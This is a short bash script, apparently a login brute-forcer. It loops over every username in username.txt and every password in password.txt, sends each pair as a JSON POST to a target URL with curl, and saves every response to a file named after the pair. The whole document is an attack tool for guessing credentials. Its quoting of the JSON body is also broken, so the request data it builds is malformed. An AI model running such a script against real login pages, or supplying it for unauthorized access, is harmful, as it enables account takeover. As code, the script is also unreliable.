#!/bin/bash

function bruteforcelogin

{
url="${1}"
foo="${2}"
bar="${3}"

for i in $(cat username.txt); 
	do for j in $(cat password.txt);
       	do curl --output "$i::$j" --data "{"$foo":"$i","$bar":"$j"}" --request POST --include $url;
	done;done
}

bruteforcelogin "$1" "$2" "$3"

exit
